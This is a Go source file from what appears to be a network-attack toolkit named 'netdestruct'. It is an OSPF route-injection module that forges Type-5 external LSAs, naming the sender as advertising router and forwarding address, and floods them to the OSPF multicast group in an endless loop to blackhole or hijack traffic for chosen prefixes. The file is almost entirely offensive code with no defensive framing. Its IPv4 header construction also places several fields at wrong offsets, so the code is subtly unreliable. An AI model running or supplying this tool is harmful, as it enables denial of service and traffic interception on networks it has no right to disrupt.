package ospf

import (
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"

	"netdestruct/libs/dos/routing"
)

const (
	ospfTag       = "\x1b[97m[OSPF]\x1b[0m"
	ospfProto     = 89
	ospfIPv4Mcast = "224.0.0.5"
)

var ospfL2Mcast = [6]byte{0x01, 0x00, 0x5E, 0x00, 0x00, 0x05}

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Blackhole injects forged OSPF Type-5 external LSAs.
type Blackhole struct {
	Interface string
	SourceIP  string
	Target    string
}

func (b *Blackhole) Run() error {
	iface, err := net.InterfaceByName(b.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", b.Interface, err)
	}
	src := net.ParseIP(b.SourceIP)
	if src == nil || src.To4() == nil {
		return fmt.Errorf("invalid IPv4 --src %q (OSPF external LSA requires IPv4)", b.SourceIP)
	}
	src4 := src.To4()
	routes, err := routing.ExpandTargets(b.Target)
	if err != nil {
		return err
	}

	var v4Routes []routing.Route
	for _, r := range routes {
		if ip := r.Addr.To4(); ip != nil {
			v4Routes = append(v4Routes, routing.Route{Addr: ip, PrefixLen: r.PrefixLen})
		}
	}
	if len(v4Routes) == 0 {
		return fmt.Errorf("no IPv4 targets for OSPF injection (IPv6 targets are not supported)")
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", b.Interface)
	}

	var total int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total updates sent: %d\n", ospfTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	fmt.Printf("%s Injecting external LSAs on %s (router-id %s, routes %d)\n",
		ospfTag, b.Interface, src4, len(v4Routes))
	fmt.Printf("%s Press Ctrl+C to stop.\n", ospfTag)

	for {
		for _, route := range v4Routes {
			frame := buildIPv4Frame(srcMAC, src4, buildLSUpdate(src4, route))
			if err := sock.Send(frame); err != nil {
				return fmt.Errorf("send: %w", err)
			}
			atomic.AddInt64(&total, 1)
			time.Sleep(10 * time.Millisecond)
		}
	}
}

func buildLSUpdate(routerID net.IP, route routing.Route) []byte {
	lsa := buildExternalLSA(routerID, route)
	totalLen := 24 + 4 + len(lsa)

	ospfHdr := make([]byte, 24)
	ospfHdr[0] = 2
	ospfHdr[1] = 4 // LS Update
	binary.BigEndian.PutUint16(ospfHdr[2:4], uint16(totalLen))
	copy(ospfHdr[4:8], routerID.To4())
	// area 0.0.0.0 (backbone) already zero
	binary.BigEndian.PutUint16(ospfHdr[14:16], 0) // null auth

	lsupd := make([]byte, 4+len(lsa))
	binary.BigEndian.PutUint32(lsupd[0:4], 1)
	copy(lsupd[4:], lsa)

	body := append(ospfHdr, lsupd...)
	binary.BigEndian.PutUint16(body[12:14], ospfChecksum(body))
	return body
}

func buildExternalLSA(routerID net.IP, route routing.Route) []byte {
	mask := routing.PrefixMask(route.PrefixLen)
	lsa := make([]byte, 36)
	binary.BigEndian.PutUint16(lsa[0:2], 1) // age
	lsa[3] = 5                              // external LSA
	copy(lsa[4:8], route.Addr.To4())        // link state ID
	copy(lsa[8:12], routerID.To4())         // advertising router
	binary.BigEndian.PutUint32(lsa[12:16], 0x80000001)
	binary.BigEndian.PutUint16(lsa[18:20], 36)
	copy(lsa[20:24], mask.To4())
	lsa[24] = 0x80 // E-bit set
	lsa[27] = 1    // metric low byte
	copy(lsa[28:32], routerID.To4()) // forwarding address = attacker
	checksum := lsaChecksum(lsa)
	copy(lsa[16:18], checksum)
	return lsa
}

func lsaChecksum(lsa []byte) []byte {
	buf := make([]byte, len(lsa)-2+2)
	copy(buf[2:], lsa[2:])
	return fletcher16(buf, 16)
}

func fletcher16(data []byte, offset int) []byte {
	if offset > len(data) {
		offset = 0
	}
	var c0, c1 int
	for _, x := range data[offset:] {
		c0 = (c0 + int(x)) % 255
		c1 = (c1 + c0) % 255
	}
	x := (255 - ((c0 + c1) % 255)) % 255
	y := (255 - c1) % 255
	if x == 0 {
		x = 255
	}
	if y == 0 {
		y = 255
	}
	return []byte{byte(x), byte(y)}
}

func ospfChecksum(pkt []byte) uint16 {
	if len(pkt) < 24 {
		return 0
	}
	sumData := append(pkt[:16], pkt[24:]...)
	return ipChecksum(sumData)
}

func buildIPv4Frame(srcMAC net.HardwareAddr, srcIP net.IP, payload []byte) []byte {
	ipLen := 20 + len(payload)
	frame := make([]byte, 14+ipLen)
	copy(frame[0:6], ospfL2Mcast[:])
	copy(frame[6:12], srcMAC)
	binary.BigEndian.PutUint16(frame[12:14], 0x0800)
	frame[14] = 0x45
	binary.BigEndian.PutUint16(frame[16:18], uint16(ipLen))
	frame[18] = 1
	frame[19] = ospfProto
	copy(frame[22:26], srcIP.To4())
	copy(frame[26:30], net.ParseIP(ospfIPv4Mcast).To4())
	binary.BigEndian.PutUint16(frame[20:22], ipChecksum(frame[14:14+ipLen]))
	copy(frame[34:], payload)
	return frame
}

func ipChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}
